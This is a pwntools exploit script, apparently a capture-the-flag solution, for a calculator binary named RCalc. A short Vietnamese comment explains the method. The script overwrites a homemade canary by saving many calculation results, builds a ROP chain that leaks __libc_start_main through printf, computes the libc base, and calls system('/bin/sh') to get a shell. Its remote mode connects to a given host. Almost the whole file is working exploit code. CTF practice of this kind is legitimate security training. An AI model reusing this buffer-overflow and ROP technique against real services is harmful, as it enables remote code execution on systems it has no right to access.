from pwn import *

def start(argv = [], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


gdbscript = '''
init-peda
b* 0x401035
continue
'''.format(**locals())

#Binary filename
exe = './RCalc_patched'
elf = context.binary = ELF(exe, checksec=False)
#context.log_level = 'debug'

################################################################

p = start()
libc = ELF("./libc6_2.23-0ubuntu11_amd64.so") #remote
# libc = ELF("./libc.so.6") #local

'''
Bài này có lỗi BufferOverflow tại chỗ nhập name nhưng 
dù không có canary chương trình có hàm sinh rand() 
và check để ngăn chặn Bof 
- Nhưng địa chỉ lưu trữ canary lại nằm trên đoạn lưu 
các giá trị chúng ta tính 0x120 nên ta có thể ghi đè 
canary lại thành số chúng ta muốn
- Rồi có canary thì ROP thôi nhưng do scanf nên ta 
ko thể có 0x20 (Space) trong payload nên ta có thể 
leak libc_start_main và dùng hàm printf để in 
- Tính libc_base và get shell như bình thường
'''

def add(i1, i2):
    p.sendlineafter(b"Your choice:", "1")
    p.sendlineafter(b"input 2 integer: ", str(i1))
    p.sendline(str(i2))
    p.sendlineafter(b"Save the result? ", 'yes')

def exit():
    p.sendlineafter(b"Your choice:", "5")

pop_rdi = 0x401123
main = 0x401036

payload = b"a" * 0x108 + p64(0) + b"b" * 8 + p64(pop_rdi) + p64(elf.got['__libc_start_main'])
payload += p64(elf.plt.printf) + p64(main)

p.sendlineafter(b"Input your name pls: ", payload)

for i in range(35):
    print(i)
    add(0, 0)

exit()

leak = u64(p.recv(6).ljust(8, b"\x00"))
info(hex(leak))
libc.address = leak - 0x20740
info(hex(libc.address))

payload = b"a" * 0x108 + p64(0) + b"b" * 8 + p64(pop_rdi) + p64(next(libc.search(b"/bin/sh")))
payload += p64(libc.sym['system'])

p.sendlineafter(b"Input your name pls: ", payload)

for i in range(35):
    print(i)
    add(0, 0)

exit()

p.interactive()
